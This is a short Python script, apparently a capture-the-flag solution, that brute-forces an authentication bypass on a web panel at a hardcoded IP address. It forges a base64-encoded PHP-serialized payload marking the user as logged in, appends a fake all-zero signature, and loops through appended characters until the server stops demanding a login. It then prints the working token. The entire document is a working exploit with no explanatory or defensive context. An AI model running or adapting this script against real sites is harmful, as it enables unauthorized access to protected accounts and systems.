#!/usr/bin/env python3
import hashlib
import itertools
from base64 import b64encode
import string
import requests

fake_signature = "0"*32
fake_signature = fake_signature.encode()

charset = string.ascii_letters
for i in range(20):
  for p in itertools.product(charset, repeat=i):
    payload = 'a:1:{s:6:"logged";b:1;}%s' % ("".join(p))
    payload = payload.encode()
    auth = b64encode(payload) + fake_signature
    auth = auth.decode('utf8')
    url = 'http://46.101.96.182/panel/index?auth=%s' % (auth)
    r = requests.get(url)
    if "login required" not in r.text:
      print(auth)
      quit()
